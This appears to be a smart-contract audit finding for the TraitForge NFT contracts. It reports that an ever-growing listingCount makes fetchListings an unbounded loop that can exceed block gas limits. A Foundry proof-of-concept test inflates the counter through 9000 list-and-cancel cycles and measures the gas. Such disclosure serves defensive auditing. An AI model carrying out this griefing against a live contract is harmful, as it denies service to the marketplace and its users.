# Vulnerability details

## Vulnerability detail
Storage variable `EntityForging::listingCount` keeps increasing  every time someone call `EntityForging::listForForging()` function and there's no where it it decreased so we have an unbounded loop in `EntityForging::fetchListings()` function that cost higher and higher gas each time `EntityForging::listingCount` increase and eventually, easily can exceeds block gas limit.

Similarly, if there's a front-end that try to fetch listed NFTs for sales or for forging, it has to loop through from 1 to `listingCount` which will eventually cause out of gas error for certain `listtingCount` value or just extremely costly to do so. In EntityTrading there's `listingCount` similar to EntityForging and `EntityTrading::listNFTForSale()` function to increase listingCount.

## Impact
The gas cost will become extremely high and eventually cause out of gas error so the front-end can't fetch listed NFTs for sales or for forging and the same result for EntityForging::fetchListings() too.

## Proof of Concept
Compare gas cost when calling entityForging::fetchListings() functions with listingCount of 5 (gas cost: ~11004) vs listingCount of 9000 (gas cost: ~54914854).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {EntityTrading} from "../src/contracts/EntityTrading/EntityTrading.sol";
import {EntityForging} from "../src/contracts/EntityForging/EntityForging.sol";
import {DevFund} from "../src/contracts/DevFund/DevFund.sol";
import {NukeFund} from "../src/contracts/NukeFund/NukeFund.sol";
import {TraitForgeNft} from "../src/contracts/TraitForgeNft/TraitForgeNft.sol";
import {EntityTrading} from "../src/contracts/EntityTrading/EntityTrading.sol";
import {EntropyGenerator} from "../src/contracts/EntropyGenerator/EntropyGenerator.sol";
import {Airdrop} from "../src/contracts/Airdrop/Airdrop.sol";



contract EntityForgingTest is Test {
    EntityForging entityForging;
    TraitForgeNft traitForgeNft;
    EntropyGenerator entropyGenerator;
    Airdrop airdrop;
    DevFund devFund;
    NukeFund nukeFund;
    EntityTrading entityTrading;

    address ownerAddr = makeAddr("ownerAddr");
    address player1 = makeAddr("player1");

    function setUp() public {
        vm.startPrank(ownerAddr);

        // Deploy TraitForgeNft contract
        traitForgeNft = new TraitForgeNft();

        // Deploy Airdrop contract
        airdrop = new Airdrop();
        traitForgeNft.setAirdropContract(address(airdrop));
        airdrop.transferOwnership(address(traitForgeNft));

        // Deploy entropyGenerator contract
        entropyGenerator = new EntropyGenerator(address(traitForgeNft));
        entropyGenerator.writeEntropyBatch1();
        traitForgeNft.setEntropyGenerator(address(entropyGenerator));

        // Deploy EntityForging contract
        entityForging = new EntityForging(address(traitForgeNft));
        traitForgeNft.setEntityForgingContract(address(entityForging));

        devFund = new DevFund();
        nukeFund = new NukeFund(address(traitForgeNft), address(airdrop), payable(address(devFund)), payable(ownerAddr));
        traitForgeNft.setNukeFundContract(payable(address(nukeFund)));

        entityTrading = new EntityTrading(address(traitForgeNft));
        entityTrading.setNukeFundAddress(payable(address(nukeFund)));

        vm.stopPrank();

        vm.deal(player1, 10000 ether);

        // Used to avoid whitelist proof
        vm.warp(86402);
        vm.roll(86402);
    }

    function testDosFetchListing() public {
        bytes32[] memory proof;
        uint tokenId = 1;
        vm.startPrank(player1);
        // try to mint a forger with potential > 0
        traitForgeNft.mintToken{value: 1 ether}(proof);
        uint256 entropy = traitForgeNft.getTokenEntropy(tokenId); 
        uint8 forgePotential = uint8((entropy / 10) % 10); 
        while(!traitForgeNft.isForger(tokenId) || forgePotential < 1) {
            traitForgeNft.mintToken{value: 1 ether}(proof);
            ++tokenId;
            entropy = traitForgeNft.getTokenEntropy(tokenId);
            forgePotential = uint8((entropy / 10) % 10); 
        }
         
        // test gas used for listingCount of 5
        for(uint i = 1; i <= 5; ++i) {
            entityForging.listForForging(tokenId, 1 ether);
            entityForging.cancelListingForForging(tokenId);
        }

        uint gasUsed5 = gasleft();
        entityForging.fetchListings();
        gasUsed5 = gasUsed5 - gasleft();

        console.log("Gas used for listingCount of 5:", gasUsed5);  // 11004

        // test gas used for listingCount of 9000
        for(uint i = 1; i <= 9000; ++i) {
            entityForging.listForForging(tokenId, 1 ether);
            entityForging.cancelListingForForging(tokenId);
        }

        uint gasUsed9000 = gasleft();
        entityForging.fetchListings();
        gasUsed9000 = gasUsed9000 - gasleft();

        console.log("Gas used for listingCount of 9000:", gasUsed9000);   // 54914854
         
        assertGt(gasUsed9000, gasUsed5);
    }
}
